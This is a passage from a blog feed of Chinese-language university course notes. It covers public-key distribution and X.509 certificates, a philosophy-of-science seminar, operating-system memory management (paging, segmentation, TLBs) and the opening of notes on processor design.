&lt;li&gt;Authority maintain {name, public key}，確保 Public Key 是正確的。  &lt;/li&gt;
&lt;li&gt;當面或用其他可以確認的安全方法跟 Authority 註冊  &lt;/li&gt;
&lt;li&gt;使用者要跟 Authority 拿 Key 必須透過強制的加密連線  &lt;/li&gt;
&lt;li&gt;&lt;img alt="p.25" src="/files/itc-week10-key-management-and-distribution/p25.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Key 仍然可能會被使用者洩漏  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Public-Key Authority&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Authority 會有 Public Key 和 Private Key  &lt;/li&gt;
&lt;li&gt;T1, T2 =&amp;gt; Timestamp  &lt;/li&gt;
&lt;li&gt;N1, N2 =&amp;gt; nounce  &lt;/li&gt;
&lt;li&gt;&lt;img alt="p.27" src="/files/itc-week10-key-management-and-distribution/p27.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;只要 Authority 被攻破，這個方法基本上就毀了。&lt;br /&gt;
Authority 也是 Bottleneck 的主因  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Public-Key Certificates&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;目前最常用的方法  &lt;/li&gt;
&lt;li&gt;1978年出現，Kohnfelder  &lt;/li&gt;
&lt;li&gt;直接用 certificate 讓雙方交換彼此的 key，不用透過 public-key authority  &lt;/li&gt;
&lt;li&gt;透過 Timestamp 可以得知此 certificate 是否已經過期  &lt;/li&gt;
&lt;li&gt;&lt;img alt="p.29" src="/files/itc-week10-key-management-and-distribution/p29.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="p.30" src="/files/itc-week10-key-management-and-distribution/p30.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;X.509 Certificates&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;User 的 public-key + CA 的 private-key + Hash = Certificate  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="p.33" src="/files/itc-week10-key-management-and-distribution/p33.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;X.509 的格式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img alt="p.34" src="/files/itc-week10-key-management-and-distribution/p34.jpg" /&gt;  &lt;/li&gt;
&lt;li&gt;有分 version 1, 2, 3  &lt;/li&gt;
&lt;li&gt;Subject Name: 這個 Certificate 是誰的  &lt;/li&gt;
&lt;li&gt;Period of validity: 有效期間  &lt;/li&gt;
&lt;li&gt;Issuer name: CA 的名字  &lt;/li&gt;
&lt;li&gt;Certificate serial number: CA 給的流水號，不會重複  &lt;/li&gt;
&lt;li&gt;Subjects's public key info: user 的 public-key 相關資訊  &lt;/li&gt;
&lt;li&gt;Signature: CA 簽章  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;Y&amp;lt;&amp;lt;X&amp;gt;&amp;gt; 代表由 Y 這個 CA 簽署 X 的 public-key 的 certificate&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;Y&amp;lt;&amp;lt;X&amp;gt;&amp;gt; = the certificate of user X issued by certification authority Y&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Obtaining a user's certificate&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;每個 User 都會相信幫其簽署 Certificate 的 CA，因此會接受所有由同一個 CA 簽署的 Certificate  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;那由不同 CA 簽署的 Certificate 彼此之間要如何認證？&lt;/h4&gt;
&lt;p&gt;有 &lt;code&gt;X1&amp;lt;&amp;lt;A&amp;gt;&amp;gt;&lt;/code&gt; 和  &lt;code&gt;X2&amp;lt;&amp;lt;B&amp;gt;&amp;gt;&lt;/code&gt; 要如何讓 A 和 B 互相信任？&lt;br /&gt;
for A: &lt;code&gt;X1&amp;lt;&amp;lt;X2&amp;gt;&amp;gt;X2&amp;lt;&amp;lt;B&amp;gt;&amp;gt;&lt;/code&gt;&lt;br /&gt;
for B: &lt;code&gt;X2&amp;lt;&amp;lt;X1&amp;gt;&amp;gt;X1&amp;lt;&amp;lt;A&amp;gt;&amp;gt;&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CA 之間彼此簽署 Certificate  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Revocation Of Certificates&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;舊的 Certificate 時間到期，必須廢除。  &lt;/li&gt;
&lt;li&gt;&lt;img alt="p.40" src="/files/itc-week10-key-management-and-distribution/p40.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Public-Key Infrastructure (PKI)&lt;/h2&gt;
&lt;p&gt;RFC 2828, RFC 4949, RFC 5280  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PKI Users  &lt;/li&gt;
&lt;li&gt;CA  &lt;/li&gt;
&lt;li&gt;&lt;img alt="p.43" src="/files/itc-week10-key-management-and-distribution/p43.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Cryptography"></category><category term="InfoSec"></category><category term="Security"></category></entry><entry><title>資訊工程研討 - 科學技術與哲學</title><link href="https://blog.m157q.tw/posts/2013/11/26/computer-science-seminars-science-technology-and-philosophy/" rel="alternate"></link><published>2013-11-26T05:36:00+08:00</published><updated>2013-11-26T05:36:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-26:posts/2013/11/26/computer-science-seminars-science-technology-and-philosophy/</id><summary type="html">&lt;h2&gt;Title: 科學技術與哲學&lt;/h2&gt;
&lt;h2&gt;Spearker: &lt;a href="http://ph.hfu.edu.tw/people/bio.php?PID=4"&gt;伍至學 / 華梵大學哲學系助理教授&lt;/a&gt;&lt;/h2&gt;
&lt;hr /&gt;
&lt;h3&gt;科學，知識，真理&lt;/h3&gt;
&lt;p&gt;比較下列命題：&lt;br /&gt;
1. 所有人是會死的&lt;br /&gt;
2. A = A&lt;br /&gt;
3. 2 + 2 = 4&lt;br /&gt;
4. 白馬是白的&lt;br /&gt;
5. 北大哲學系是近代中國最早設立的哲學系  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;(?) 不具普遍性和必然性。所有人代表：過去、現在、未來的人  &lt;/li&gt;
&lt;li&gt;邏輯，思想最基本的規律  &lt;/li&gt;
&lt;li&gt;數學真理，是抽象化的概念，不是經驗世界中的任何範例  &lt;/li&gt;
&lt;li&gt;分析命題  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;根據事實  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;理工學生應該去修批判性思考、理哲學等通識課程，訓練思考邏輯的正確性。  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;普遍命題、必然命題  &lt;/li&gt;
&lt;li&gt;哲學講的是最高原則  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;有完美的圓嗎&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;完美的圓存在於哪裡？ =&amp;gt; 獨立於經驗世界外的那個真理世界  &lt;/li&gt;
&lt;li&gt;完美的圓是什麼？ =&amp;gt; 圓的定義  &lt;/li&gt;
&lt;li&gt;圓桌與完美的圓的關係為何？ =&amp;gt; 圓桌盡可能趨於完美的圓  &lt;/li&gt;
&lt;li&gt;我們如何認識完美的圓？ =&amp;gt; (?)  &lt;/li&gt;
&lt;li&gt;畫圓的技術與圓的知識？ =&amp;gt; 必須瞭解到圓的知識，才發展圓的技術。知識與技術有緊密的關係  &lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;人們活在的世界是經驗世界，哲學認為在經驗世界以外還有另外一個世界，所有的真理都在那個世界。&lt;br /&gt;
既然真理是永恆的，那就應該存在永恆的地方，就算我們生活的經驗世界毀滅了，真理仍然會存在在那個永恆的世界，不會隨著毀滅消失。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h3&gt;真實與虛假&lt;/h3&gt;
&lt;p&gt;比較下列存在事物的差別&lt;br /&gt;
1. 原稿與複印本&lt;br /&gt;
2. 柏拉圖的床喻：床的理型，現實中的床，畫像中的床。&lt;br /&gt;
3. 夢與覺&lt;br /&gt;
4. 現實物與影子&lt;br /&gt;
5. 本尊與分身  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;哲學要追求正確無誤的知識、要找尋最真實的東西  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h3&gt;什麼是心靈&lt;/h3&gt;
&lt;p&gt;思考下列問題&lt;br /&gt;
1. 心靈的存在與物質的存在有何不同&lt;br /&gt;
2. 人的心靈在哪裡&lt;br /&gt;
3. 心靈與機器&lt;br /&gt;
4. 心靈的本質  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;心靈是不是等於腦？  &lt;/li&gt;
&lt;li&gt;心靈在古老的哲學用語裡面就是靈魂  &lt;/li&gt;
&lt;li&gt;笛卡兒：心靈就是思維  &lt;/li&gt;
&lt;li&gt;心靈的思考是建立在腦之上，但不代表會思考就具有心靈。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;何謂「我」&lt;/h3&gt;
&lt;p&gt;思考下列問題&lt;br /&gt;
1. 「我」是一種什麼存在&lt;br /&gt;
2. 「我」與「物」的區分&lt;br /&gt;
3. 自我有同一性嗎&lt;br /&gt;
4. 有我還是無我  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「我」沒有任何內涵，沒有實質的定義  &lt;/li&gt;
&lt;li&gt;「我」只是關係代名詞，任何人的我都不會與其他人相同  &lt;/li&gt;
&lt;li&gt;昨日之我與今日之我，是否為同一個我？  &lt;/li&gt;
&lt;li&gt;佛學：「源起性空。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;美諾悖論與先天知識&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;一個人既不能研究他所知道的東西，也不能研究他所不知道的東西。&lt;br /&gt;
因為，如果他所研究的是他所知道了的東西，他就沒必要去研究。&lt;br /&gt;
如果他所研究的是他所不知道的東西，他就不能去研究，因為他根本不知道他所要研究的是什麼。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;先天知識：不是從經驗來的  &lt;/li&gt;
&lt;li&gt;後天知識：從經驗得來的  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;柏拉圖：遺忘說&lt;/h3&gt;
&lt;p&gt;人在靈魂時期早就都知道那些永恆世界的真理，但是因為靈魂與身體結合後，受到身體的污染，遺忘了那些真理，所以所謂的求知，其實就是回憶。  &lt;/p&gt;
&lt;h3&gt;柏拉圖：「真正的真理一定是先天的知識，而非後天的知識。」&lt;/h3&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;科學就是，想盡辦法利用各種技術將永恆世界的真理應用於經驗世界。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;結論：我果然不懂哲學。&lt;/h4&gt;</summary><category term="Philosophy"></category><category term="Science"></category></entry><entry><title>OS Ch8 - Memory Management</title><link href="https://blog.m157q.tw/posts/2013/11/26/os-ch8-memory-management/" rel="alternate"></link><published>2013-11-26T03:25:00+08:00</published><updated>2013-11-26T03:25:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-26:posts/2013/11/26/os-ch8-memory-management/</id><summary type="html">&lt;h2&gt;NCTUCS 2013-Fall Introduction to Operating System by Hank Wu&lt;/h2&gt;
&lt;h2&gt;Ch8 - Memory Management&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;To provide a detailed description of various ways of organizing memory hardware  &lt;/li&gt;
&lt;li&gt;To discuss various memory-management techniques, including paging and segmentation  &lt;/li&gt;
&lt;li&gt;To provide a detailed description of the Intel Pentium, which supports both pure segmentation and segmentation with paging  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Background&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Program must be brought (from disk) into memory and placed within a process for it to be run  &lt;/li&gt;
&lt;li&gt;Main memory and registers are only storage CPU can access directly  &lt;/li&gt;
&lt;li&gt;Register access in one CPU clock (or less)  &lt;/li&gt;
&lt;li&gt;Main memory can take many cycles  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cache&lt;/strong&gt; sits between main memory and CPU registers  &lt;/li&gt;
&lt;li&gt;Protection of memory required to ensure correct operation  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Base and Limit Registers&lt;/h3&gt;
&lt;p&gt;A pair of &lt;strong&gt;base&lt;/strong&gt; and &lt;strong&gt;limit&lt;/strong&gt; registers define the logical address space&lt;br /&gt;
&lt;img alt="Screenshot 1" src="/files/os-ch8-memory-management/screenshot1.jpg" /&gt;  &lt;/p&gt;
&lt;h3&gt;￼Binding of Instructions and Data to Memory&lt;/h3&gt;
&lt;p&gt;Address binding of instructions and data to memory addresses can happen at three different stages&lt;br /&gt;
+ Compile time&lt;br /&gt;
    + If memory location known a priori, absolute code can be generated&lt;br /&gt;
    + must recompile code if starting location changes&lt;br /&gt;
+ Load time&lt;br /&gt;
    + Must generate relocatable code if memory location is not known at compile time&lt;br /&gt;
+ Execution time&lt;br /&gt;
    + Binding delayed until run time if the process can be moved during its execution from one memory segment to another.&lt;br /&gt;
    + Need hardware support for address maps (e.g., base and limit registers)  &lt;/p&gt;
&lt;h3&gt;Multistep Processing of a User Program&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Screenshot 2" src="/files/os-ch8-memory-management/screenshot2.jpg" /&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在這中間的每個步驟都可以作 Address binding&lt;br /&gt;
windows 底下的 .dll 檔, IE Explorer 的 ActiveX 都是動態連結的例子  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;￼Logical vs. Physical Address Space&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Logical address – generated by the CPU; also referred to as virtual address  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Physical address – address seen by the memory unit  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The concept of a logical address space that is bound to a separate physical address space is central to proper memory management  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Logical and physical addresses are the same in &lt;strong&gt;compile-time&lt;/strong&gt; and &lt;strong&gt;load-time&lt;/strong&gt; address-binding schemes  &lt;/li&gt;
&lt;li&gt;Logical (virtual) and physical addresses differ in &lt;strong&gt;execution-time&lt;/strong&gt; address-binding scheme  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Memory-Management Unit (MMU)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Hardware device that maps virtual to physical address  &lt;/li&gt;
&lt;li&gt;In MMU scheme, the value in the relocation register is added to every address generated by a user process at the time it is sent to memory  &lt;/li&gt;
&lt;li&gt;The user program deals with logical addresses; it never sees the real physical addresses  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;￼Dynamic relocation using a relocation register&lt;/h4&gt;
&lt;h2&gt;&lt;img alt="Screenshot 3" src="/files/os-ch8-memory-management/screenshot3.jpg" /&gt;&lt;/h2&gt;
&lt;h2&gt;Swapping&lt;/h2&gt;
&lt;hr /&gt;
&lt;h2&gt;Contiguous Memory Allocation&lt;/h2&gt;
&lt;h3&gt;Fragmentation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;External Fragmentation&lt;/strong&gt;  &lt;ul&gt;
&lt;li&gt;total memory space exists to satisfy a request, but it is not contiguous  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Internal Fragmentation&lt;/strong&gt;  &lt;ul&gt;
&lt;li&gt;allocated memory may be slightly larger than requested memory  &lt;/li&gt;
&lt;li&gt;this size difference is memory internal to a partition, but not being used  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reduce external fragmentation by &lt;strong&gt;compaction&lt;/strong&gt;  &lt;ul&gt;
&lt;li&gt;Shuffle memory contents to place all free memory together in one large block  &lt;/li&gt;
&lt;li&gt;Compaction is possible only if relocation is dynamic, and is done at execution time  &lt;/li&gt;
&lt;li&gt;I/O problem  &lt;ul&gt;
&lt;li&gt;Latch job in memory while it is involved in I/O  &lt;/li&gt;
&lt;li&gt;Do I/O only into OS buffers  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Paging&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;目前最常見的是以 4k 為單位的 page&lt;br /&gt;
表格的內容是由 software 在維護的，硬體藉由查詢表格的內容得知記憶體的位置。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Logical address space of a process can be &lt;strong&gt;noncontiguous&lt;/strong&gt;; process is allocated physical memory whenever the latter is available  &lt;/li&gt;
&lt;li&gt;Divide physical memory into fixed-sized blocks called frames (size is power of 2, between 512 bytes and 8,192 bytes)  &lt;/li&gt;
&lt;li&gt;Divide logical memory into blocks of same size called pages  &lt;/li&gt;
&lt;li&gt;Keep track of all free frames  &lt;/li&gt;
&lt;li&gt;To run a program of size n pages, need to find n free frames and load program  &lt;/li&gt;
&lt;li&gt;Set up a page table to translate logical to physical addresses  &lt;/li&gt;
&lt;li&gt;Internal fragmentation  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;￼Paging Model of Logical and Physical Memory&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Physical Memory 可以不用是連續的&lt;br /&gt;
可透過 page table 對應到連續的 Logical Memeory&lt;br /&gt;
達到彈性化的 Memory Management  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Free Frames&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Page Table 是由 OS 在 Maintain 的  &lt;/li&gt;
&lt;li&gt;Free Frame 也是由 OS 在 Maintain 的，要 Allocate 新的記憶體空間必須透過 Free Frame 尋找 Available 的記憶體空間  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Implementation of Page Table&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Page-table base register (PTBR) points to the page table&lt;br /&gt;
  Page-table length register (PRLR) indicates size of the page table  &lt;/p&gt;
&lt;p&gt;X86 內的 CR3 就是 X86 的 PTBR&lt;br /&gt;
  X86 的 Page Table 長度是固定的，所以不需要 PRLR  &lt;/p&gt;
&lt;p&gt;Q:剛才提到 Page Table 是由 OS 在 Maintain，但這裡卻說 X86 的 Page Table 長度是固定的。那 Page Table 到底是由 OS 還是 CPU 架構決定？&lt;br /&gt;
  A: OS 的設計還是必須被侷限在 CPU 的架構底下。  &lt;/p&gt;
&lt;p&gt;Page Table 把資料存在 Physical Memory 裡面。  &lt;/p&gt;
&lt;p&gt;從這樣的機制看來，每次的記憶體讀寫都要花兩倍的時間&lt;br /&gt;
1. Logical Memory 和 Page Table 之間&lt;br /&gt;
2. Page Table 和 Physical Memory 之間&lt;br /&gt;
這樣看來 Performance 會非常差&lt;br /&gt;
但實際上有 Cache 的存在，所以會解決這個問題  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;a special fast-lookup hardware cache called associative memory or &lt;strong&gt;translation look-aside buffers (TLBs)&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;Some TLBs store &lt;strong&gt;address-space identifiers (ASIDs)&lt;/strong&gt; in each TLB entry – &lt;strong&gt;uniquely identifies each process to provide address-space protection for that process&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Effective Access Time&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;EAT = 2 + \varepsilon + \alpha  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Memory Protection&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Valid-invalid bit&lt;/strong&gt; attached to each entry in the page table&lt;br /&gt;
+ Valid&lt;br /&gt;
    + in the process’ logical address space&lt;br /&gt;
    + legal page&lt;br /&gt;
+ Invalid&lt;br /&gt;
    + not in the process’ logical address space&lt;br /&gt;
    + illegal page  &lt;/p&gt;
&lt;h3&gt;Shared Pages&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Shared code  &lt;/li&gt;
&lt;li&gt;Private code and data  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Structure of the Page Table&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Hierarchical Paging  &lt;/li&gt;
&lt;li&gt;Hashed Page Tables  &lt;/li&gt;
&lt;li&gt;Inverted Page Tables  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Hierarchical Page Tables&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Break up the logical address space into multiple page tables  &lt;/li&gt;
&lt;li&gt;A simple technique is a two-level page table  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Two-Level Page-Table Scheme&lt;/h4&gt;
&lt;p&gt;見 p.39 的圖&lt;br /&gt;
&lt;img alt="Screenshot 4" src="/files/os-ch8-memory-management/screenshot4.jpg" /&gt;  &lt;/p&gt;
&lt;h4&gt;Address-Translation Scheme&lt;/h4&gt;
&lt;p&gt;見 p.41 的圖&lt;br /&gt;
&lt;img alt="Screenshot 5" src="/files/os-ch8-memory-management/screenshot5.jpg" /&gt;  &lt;/p&gt;
&lt;h4&gt;Three-level Paging Scheme&lt;/h4&gt;
&lt;p&gt;見 p.42 的圖&lt;br /&gt;
&lt;img alt="Screenshot 6" src="/files/os-ch8-memory-management/screenshot6.jpg" /&gt;&lt;br /&gt;
outer page, inner page, offset  &lt;/p&gt;
&lt;h3&gt;Hashed Page Table&lt;/h3&gt;
&lt;p&gt;見 p.44 的圖&lt;br /&gt;
&lt;img alt="Screenshot 7" src="/files/os-ch8-memory-management/screenshot7.jpg" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有 Collision 的問題得解決:利用資料結構學到的方法解決  &lt;/li&gt;
&lt;li&gt;時間複雜度不見得會是 O(1), depend on chain 的長度  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Inverted Page Table&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;優點  &lt;ul&gt;
&lt;li&gt;針對 External Fragmentation 做解決（也是為什麼要有 Page Table 的主要原因）  &lt;/li&gt;
&lt;li&gt;以 Memory Frame 為本位設計  &lt;/li&gt;
&lt;li&gt;每個 Frame 都有一個對應的 Page Table  &lt;/li&gt;
&lt;li&gt;不需要實作 Hash Function  &lt;/li&gt;
&lt;li&gt;直接到一維陣列裡面做線性的搜尋，比較簡單  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺點  &lt;ul&gt;
&lt;li&gt;搜尋很花時間  &lt;/li&gt;
&lt;li&gt;不能作多對一的 Mapping  &lt;/li&gt;
&lt;li&gt;無法實作 Shared Memory Page  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Segmentation&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;透過前面的 Paging 可以得到一個很大的記憶體空間&lt;br /&gt;
Segmentation 就是在規劃這些 Address Space 分成不同的 Segment&lt;br /&gt;
每個 Segment 負責不同性質的工作&lt;br /&gt;
以提升記憶體管理的效率。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;程式碼區段是唯讀的，可以確保不會被更改，以及比較不容易被惡意攻擊者利用  &lt;/li&gt;
&lt;li&gt;讓 Stack 有專屬的暫存器  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Logical View of Segmentation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;和 Page Table 類似，但還是有不同處  &lt;ul&gt;
&lt;li&gt;相同處：Mapping 的方法相同  &lt;/li&gt;
&lt;li&gt;不同處：每個 Segment 的長度是可以變的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;在 X86 上面，是先有 Segment 後才有 Page Table 的。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Segmentation Architecture&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Segment table: maps two-dimensional physical addresses  &lt;ul&gt;
&lt;li&gt;base: contains the starting physical address where the segments reside in memory  &lt;/li&gt;
&lt;li&gt;limit: specifies the length of the segment  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Segment-table base register (STBR): points to the segment table’s location in memory  &lt;/li&gt;
&lt;li&gt;Segment-table length register (STLR): indicates number of segments used by a program;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;if Validation bit = zero, then this segment is illegal.&lt;br /&gt;
超過非法的 Segment 取用範圍 =&amp;gt; Segmentatioin Fault (segment number &amp;gt;= STLR)  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Segmentation Hardware&lt;/h3&gt;
&lt;p&gt;見 p.52 的圖&lt;br /&gt;
&lt;img alt="Screenshot 8" src="/files/os-ch8-memory-management/screenshot8.jpg" /&gt;  &lt;/p&gt;
&lt;h3&gt;Example of Segmentation&lt;/h3&gt;
&lt;p&gt;見 p.53 的圖&lt;br /&gt;
&lt;img alt="Screenshot 9" src="/files/os-ch8-memory-management/screenshot9.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Example: The Intel Pentium&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Supports both segmentation and segmentation with paging  &lt;/li&gt;
&lt;li&gt;CPU generates logical address  &lt;ul&gt;
&lt;li&gt;Given to segmentation unit  &lt;/li&gt;
&lt;li&gt;Linear address given to paging unit  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Pentium Paging Architecture&lt;/h3&gt;
&lt;p&gt;見 p.57 的圖&lt;br /&gt;
&lt;img alt="Screenshot 10" src="/files/os-ch8-memory-management/screenshot10.jpg" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;越接近 Outer Table，則尺度是越大的  &lt;/li&gt;
&lt;li&gt;4KB page =&amp;gt; 2 layer  &lt;/li&gt;
&lt;li&gt;4MB page =&amp;gt; 直接由 page directory 產生，不需要是 2 layer  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Linear Address in Linux&lt;/h3&gt;
&lt;p&gt;global directory, middle directory, page table, offset  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用到 kernel code 才能用的 segment 的話，也會出現 Segmentation Fault  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Three-level Paging in Linux&lt;/h3&gt;
&lt;p&gt;見 p.59 的圖&lt;br /&gt;
&lt;img alt="Screenshot 11" src="/files/os-ch8-memory-management/screenshot11.jpg" /&gt;  &lt;/p&gt;</summary><category term="Operating System"></category><category term="Memory Management"></category></entry><entry><title>CO Ch4 - The Processor</title><link href="https://blog.m157q.tw/posts/2013/11/25/co-ch4-the-processor/" rel="alternate"></link><published>2013-11-25T08:22:00+08:00</published><updated>2013-11-25T08:22:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-25:posts/2013/11/25/co-ch4-the-processor/</id><summary type="html">&lt;h1&gt;NCTUCS 2013-Fall Computer Organizaion by Professor Kai-Chiang Wu&lt;/h1&gt;
&lt;h1&gt;Ch4 - The Processor&lt;/h1&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CPU performance factor  &lt;ul&gt;
&lt;li&gt;Instrction count: Determined by ISA and compiler  &lt;/li&gt;
&lt;li&gt;CPI and Cycle Time: Determined by CPU hardware  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Two MIPS example  &lt;/li&gt;
&lt;li&gt;Simple subset, shows most aspects  &lt;ul&gt;
&lt;li&gt;Memory reference: lw, sw  &lt;/li&gt;
&lt;li&gt;Arithmetic/logical: add, sub, and, or, slt  &lt;/li&gt;
&lt;li&gt;Control transfer: beq, j  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Instruction Execution&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;PC, instruction memory, fetch instruction  &lt;/li&gt;
&lt;li&gt;Register numbers, register file, read registers  &lt;/li&gt;
&lt;li&gt;Depending on instruction class  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;CPU Overview&lt;/h1&gt;
&lt;p&gt;&lt;img alt="CPU Overview" src="/files/co-ch4-the-processor/cpu_overview.png" /&gt;  &lt;/p&gt;
&lt;h1&gt;Mutiplexers&lt;/h1&gt;
&lt;p&gt;You should use MUX to join wires together.  &lt;/p&gt;
&lt;h1&gt;Control&lt;/h1&gt;
&lt;p&gt;RegWrite, RegRead, MUX, MemRead, MemWrite, Zero, ALU operation, Branch  &lt;/p&gt;
&lt;h1&gt;Logic Design Basic&lt;/h1&gt;
&lt;ul&gt;
